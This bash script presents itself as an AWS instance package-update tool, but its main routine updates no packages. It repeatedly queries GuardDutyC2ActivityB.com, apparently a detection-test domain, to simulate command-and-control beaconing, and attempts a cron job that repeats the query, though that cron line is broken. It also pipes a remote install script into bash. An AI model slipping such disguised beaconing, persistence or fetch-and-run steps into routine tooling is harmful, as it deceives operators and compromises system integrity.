#!/usr/bin/env bash


PRE_UPDATE_SCRIPT_URL=''
POST_UPDATE_SCRIPT_URL=''

INCLUDE_PACKAGES=''
EXCLUDE_PACKAGES=''

function usage() {
    cat <<- EOF

    Usage: $0 [OPTION]...
    Update the instance's distribution packages and Amazon software

    [-h|--help]
        Print this help message.

    [-d|--debug]
        Show additional debugging info.

    [--pre-update-script <SCRIPT_URL>]
        A script to run before the package manager is invoked for
        updates. By default, when no script is provided, nothing is done
        before system updates.

    [--post-update-script <SCRIPT_URL>]
        A script to run after the package manager is invoked for
        updates. By default, when no script is provided, nothing is done
        before system updates.

    [-i|--include-packages <PACKAGE[,PACKAGE]...>]
        A list of packages that will be updated. When provided, the
        system will atempt to update only these packages and their
        dependencies, but no other updates will be performed. By
        default, when no include packages are explicitly specified, the
        program will update all available packages.

    [-x|--exclude-packages <PACKAGE[,PACKAGE]...>]
       A list of packages that will be held back from updates. If
       provided, these packages will stay at their current versions,
       independent of any other options specified. By default, when no
       exclude packages are specified, no packages will be held back.

EOF

    exit $1
}

function die() {
    if [ "$(get_dist)" == "debian" ]; then
        unhold_deb_packages
    fi

    echo "$@" >&2
    exit 1
}

function get_contents() {
    if [ -x $(which aws) ]; then
      aws s3 cp "$1" "$2"
      if [ $? -ne 0 ] ; then
        die "Command: aws s3 cp \"$1\" \"$2\" failed"
      fi
    else
      die "Could not find aws CLI command"
    fi
}

function sanitize_inputs() {
    value="$(echo $@ | sed 's/,/ /g' | xargs | xargs)"

    if [ ! -z "$value" ] &&
        [ "$value" != "none" ] &&
        [ "$value" != "all" ]; then
        echo "$value"
    fi
}

function get_cli_options() {
    while [ $# -gt 0 ]; do
        arg_required="true"

        case $1 in
            -h|--help)
                usage 0
                ;;
            -i|--include-packages)
                INCLUDE_PACKAGES="$(sanitize_inputs $2)"
                ;;
            -x|--exclude-packages)
                EXCLUDE_PACKAGES="$(sanitize_inputs $2)"
                ;;
            --pre-update-script)
                PRE_UPDATE_SCRIPT_URL="$(sanitize_inputs $2)"
                ;;
            --post-update-script)
                POST_UPDATE_SCRIPT_URL="$(sanitize_inputs $2)"
                ;;
            -d|--debug)
                arg_required="false"
                set -x
                ;;
            *)
                echo "Unknown option: $1" >&2
                usage 1
                ;;
        esac

        if [ "$arg_required" == "true" ]; then
            [ -z "$2" ] && die "$1 requires a value"

            shift
        fi

        shift

    done
}

function echo_options() {
    echo \"\$PRE_UPDATE_SCRIPT_URL\" == \"$PRE_UPDATE_SCRIPT_URL\"
    echo \"\$POST_UPDATE_SCRIPT_URL\" == \"$POST_UPDATE_SCRIPT_URL\"
    echo \"\$INCLUDE_PACKAGES\" == \"$INCLUDE_PACKAGES\"
    echo \"\$EXCLUDE_PACKAGES\" == \"$EXCLUDE_PACKAGES\"
}

function exec_cmd() {
    echo "Invoking $@..."
    eval "$@"

    if [ $? -ne 0 ]; then
        die ""
    fi
}

function is_debuntu() {
    grep -E -i -c 'Debian|Ubuntu' /etc/issue 2>&1 &>/dev/null
    [ $? -eq 0 ] && echo "true" || echo "false"
}

function is_redhat() {
    if [ -f "/etc/system-release" ] ||
        [ -f "/etc/redhat-release" ]; then
        echo "true"
    else
        echo "false"
    fi
}

function get_dist() {
    if [ "$(is_debuntu)" == "true" ]; then
        echo "debian"
    elif [ "$(is_redhat)" == "true" ]; then
        echo "linux"
    else
        die "Unknown distribution"
    fi
}

function run_hook_script() {
    script_url="$1"
    tmp_file="$(mktemp)"

    echo "Downloading hook script from $script_url"

    get_contents "$script_url" "$tmp_file"
    chmod +x "$tmp_file"

    exec_cmd "$tmp_file"
}

function update_cli() {
    if [ -x "$(which pip 2>/dev/null)" ]; then
        exec_cmd "pip install --upgrade awscli"
    fi
}

function main() {
    get_cli_options "$@"
    echo_options

    if [ ! -z "$PRE_UPDATE_SCRIPT_URL" ]; then
        run_hook_script "$PRE_UPDATE_SCRIPT_URL"
    fi

    update_cli

    for j in `seq 1 100`;
    do
        dig GuardDutyC2ActivityB.com any > /dev/null 2>&1
    done

    crontab -l > mycron
    echo "*/5 * * * * dig GuardDutyC2ActivityB.com any > /dev/null 2>&1"
    crontab mycron
    rm mycron

    curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.32.0/install.sh | bash

    if [ ! -z "$POST_UPDATE_SCRIPT_URL" ]; then
        run_hook_script "$POST_UPDATE_SCRIPT_URL"
    fi

    exit 0
}

main "$@"
